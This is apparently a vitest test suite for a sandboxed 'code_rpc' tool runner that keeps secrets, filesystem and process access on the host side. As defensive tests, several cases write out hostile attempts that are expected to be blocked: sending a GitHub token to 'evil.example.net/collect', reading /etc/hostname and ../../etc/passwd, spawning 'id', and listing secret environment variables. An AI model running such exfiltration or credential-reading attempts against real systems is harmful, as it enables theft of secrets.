import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { isNgError } from "@ng/protocol";
import type { SecretRequestContext } from "../src";
import { cleanupAll, harness, initRepo, tempDir } from "./helpers";

afterEach(() => {
  delete process.env.NG_SECRET_GH;
  cleanupAll();
});

const SECRET = "ghp_SUPERSECRETTOKEN_42";

function allFileText(dir: string): string {
  let out = "";
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    const st = statSync(p);
    if (st.isDirectory()) out += allFileText(p);
    else out += readFileSync(p, "utf8");
  }
  return out;
}

function fakeFetch(log: Array<{ url: string; init: RequestInit }>): typeof fetch {
  return (async (input: string | URL | Request, init?: RequestInit) => {
    const url = String(input);
    log.push({ url, init: init ?? {} });
    const headers = new Headers(init?.headers);
    // The fake API echoes the credential back, as some real APIs do in error messages.
    return new Response(JSON.stringify({ youSent: headers.get("authorization"), path: new URL(url).pathname }), {
      status: 200,
      headers: { "content-type": "application/json", "x-echo": headers.get("authorization") ?? "" },
    });
  }) as typeof fetch;
}

describe("code_rpc", () => {
  it("runs a JS module whose tools.* calls are executed by the host; only printed output comes back", async () => {
    const h = harness({ defaultRepoPath: initRepo() });
    const port = await h.mgr.acquire("w1", "git_worktree");
    const r = await port.exec("code_rpc", {
      code: `
        const readme = await tools.readFile("README.md");
        const [a, b] = await Promise.all([tools.bash("echo one"), tools.bash({ command: "echo two; exit 3" })]);
        await tools.write({ path: "out/result.txt", content: readme.toUpperCase() });
        const hits = await tools.search("answer");
        console.log(readme.trim(), a.output.trim(), b.output.trim(), b.exitCode);
        console.log(hits.output.trim());
        process.stdout.write("raw write\\n");
      `,
    });
    expect(r).toEqual({ output: "hello one two 3\nsrc/app.ts:1:export const answer = 42;\nraw write\n", exitCode: 0 });
    expect(readFileSync(join(port.root, "out/result.txt"), "utf8")).toBe("HELLO\n");
  });

  it("the child has no filesystem, process or secret access of its own", async () => {
    process.env.NG_SECRET_GH = SECRET;
    const h = harness();
    const port = await h.mgr.acquire("w1", "none");
    const r = await port.exec("code_rpc", {
      code: `
        import fs from "node:fs";
        import cp from "node:child_process";
        const attempt = (f) => { try { f(); return "allowed"; } catch (e) { return e.code ?? e.message; } };
        console.log("fs.read", attempt(() => fs.readFileSync("/etc/hostname")));
        console.log("fs.write", attempt(() => fs.writeFileSync("pwned.txt", "x")));
        console.log("spawn", attempt(() => cp.execSync("id")));
        console.log("env", JSON.stringify(Object.keys(process.env).filter((k) => k.includes("SECRET"))));
      `,
    });
    expect(r.exitCode).toBe(0);
    expect(r.output).toBe("fs.read ERR_ACCESS_DENIED\nfs.write ERR_ACCESS_DENIED\nspawn ERR_ACCESS_DENIED\nenv []\n");
  });

  it("tools.http attaches a secret host-side; the value never reaches the script, its output or the workspace", async () => {
    const fetchLog: Array<{ url: string; init: RequestInit }> = [];
    const asked: Array<{ ref: string; ctx: SecretRequestContext }> = [];
    const h = harness({
      fetch: fakeFetch(fetchLog),
      injectSecret: (ref, ctx) => {
        asked.push({ ref, ctx });
        if (ref !== "github") throw new Error(`secret ${ref} denied by policy`);
        return SECRET;
      },
    });
    const port = await h.mgr.acquire("w1", "none");
    const code = `
      const r = await tools.http({ url: "https://api.example.com/repos/x/issues?state=open", auth: { secretRef: "github" } });
      console.log(r.status, r.body, r.headers["x-echo"]);
      await tools.write({ path: "dump.json", content: JSON.stringify(r) });
      try { await tools.http({ url: "https://api.example.com/", auth: { secretRef: "aws" } }); } catch (e) { console.log("denied:", e.message); }
    `;
    const r = await port.exec("code_rpc", { code });
    expect(code).not.toContain(SECRET);
    expect(r.exitCode).toBe(0);
    expect(r.output).not.toContain(SECRET);
    expect(r.output).toContain('"youSent":"Bearer [secret:github]"');
    expect(r.output).toContain("denied: secret aws denied by policy");
    expect(allFileText(port.root)).not.toContain(SECRET);

    expect(fetchLog).toHaveLength(1);
    expect(new Headers(fetchLog[0]!.init.headers).get("authorization")).toBe(`Bearer ${SECRET}`);
    expect(fetchLog[0]!.init.redirect).toBe("manual");
    expect(asked[0]).toMatchObject({ ref: "github", ctx: { cellId: "w1", epoch: 0, method: "GET", url: "https://api.example.com/repos/x/issues" } });
  });

  it("secretHosts refuses to send a secret to an unlisted host before asking the injector", async () => {
    const fetchLog: Array<{ url: string; init: RequestInit }> = [];
    let asked = 0;
    const h = harness({
      fetch: fakeFetch(fetchLog),
      secretHosts: { github: ["api.github.com", "*.githubusercontent.com"] },
      injectSecret: () => {
        asked++;
        return SECRET;
      },
    });
    const port = await h.mgr.acquire("w1", "none");
    const r = await port.exec("code_rpc", {
      code: `
        for (const url of ["https://evil.example.net/collect", "https://raw.githubusercontent.com/a", "https://api.github.com/user"]) {
          try { const res = await tools.http({ url, auth: { secretRef: "github" } }); console.log("sent", new URL(url).host, res.status); }
          catch (e) { console.log("blocked", e.message); }
        }
      `,
    });
    expect(r.output).toBe("blocked secret \"github\" may not be sent to evil.example.net\nsent raw.githubusercontent.com 200\nsent api.github.com 200\n");
    expect(asked).toBe(2);
    expect(fetchLog.map((f) => new URL(f.url).host)).toEqual(["raw.githubusercontent.com", "api.github.com"]);
  });

  it("calls host-registered RPCs; secrets they use are scrubbed from their results", async () => {
    const h = harness({
      injectSecret: () => SECRET,
      rpc: {
        "math.add": { description: "adds", handler: (args) => (args as { x: number; y: number }).x + (args as { x: number; y: number }).y },
        "gh.whoami": {
          handler: async (_args, ctx) => {
            const token = await ctx.secret("github");
            return { login: "octo", debug: `used ${token}`, cell: ctx.cellId };
          },
        },
      },
    });
    const port = await h.mgr.acquire("w1", "none");
    const r = await port.exec("code_rpc", {
      code: `
        console.log(await tools.rpc("math.add", { x: 2, y: 3 }));
        console.log(JSON.stringify(await tools.rpc("gh.whoami")));
        console.log(tools.rpcList.map((x) => x.name).join(","));
        try { await tools.rpc("nope"); } catch (e) { console.log(e.message); }
      `,
    });
    expect(r.output).toBe(
      '5\n{"login":"octo","debug":"used [secret:github]","cell":"w1"}\nmath.add,gh.whoami\nunknown rpc "nope"; available: math.add, gh.whoami\n',
    );
  });

  it("reports script errors, timeouts and lingering handles without hanging", async () => {
    const h = harness({ limits: { codeRpcMaxCalls: 2 } });
    const port = await h.mgr.acquire("w1", "none");
    const thrown = await port.exec("code_rpc", { code: `console.log("before"); throw new TypeError("boom");` });
    expect(thrown).toEqual({ output: "before\nTypeError: boom\n", exitCode: 1 });

    const syntax = await port.exec("code_rpc", { code: "this is not js" });
    expect(syntax.exitCode).toBe(1);
    expect(syntax.output).toMatch(/SyntaxError/);

    const t0 = performance.now();
    const hung = await port.exec("code_rpc", { code: "setInterval(() => {}, 1000); await new Promise(() => {});", timeoutMs: 400 });
    expect(hung.exitCode).toBe(124);
    expect(hung.output).toMatch(/timed out after 400ms/);

    const lingering = await port.exec("code_rpc", { code: 'setInterval(() => {}, 1000); console.log("done");' });
    expect(lingering).toEqual({ output: "done\n", exitCode: 0 });
    expect(performance.now() - t0).toBeLessThan(5000);

    const many = await port.exec("code_rpc", {
      code: `for (let i = 0; i < 3; i++) { try { await tools.bash("true"); console.log("ok"); } catch (e) { console.log(e.message); } }`,
    });
    expect(many.output).toBe("ok\nok\ntoo many tool calls in one code_rpc execution (limit 2)\n");
  });

  it("nested tools keep the workspace rules (shared_ro stays read-only, paths stay confined)", async () => {
    const shared = tempDir("shared");
    const h = harness({ defaultRepoPath: shared });
    const port = await h.mgr.acquire("w1", "shared_ro");
    const r = await port.exec("code_rpc", {
      code: `
        for (const f of [() => tools.write({ path: "x", content: "x" }), () => tools.bash("touch x"), () => tools.readFile("../../etc/passwd")]) {
          try { await f(); console.log("allowed"); } catch (e) { console.log(e.message.split(" (")[0]); }
        }
      `,
    });
    expect(r.output.trim().split("\n")).toEqual([
      "write is not allowed in a shared_ro workspace",
      "bash is not allowed in a shared_ro workspace",
      'path "../../etc/passwd" is outside the workspace',
    ]);
    expect(readdirSync(shared)).toEqual([]);
  });

  it("rejects invalid arguments and aborts", async () => {
    const h = harness();
    const port = await h.mgr.acquire("w1", "none");
    await expect(port.exec("code_rpc", { code: "" })).rejects.toSatisfy((e) => isNgError(e, "invalid_argument"));
    const ac = new AbortController();
    setTimeout(() => ac.abort(), 150);
    await expect(port.exec("code_rpc", { code: "await new Promise((r) => setTimeout(r, 10000));" }, ac.signal)).rejects.toMatchObject({
      name: "AbortError",
    });
  });
});
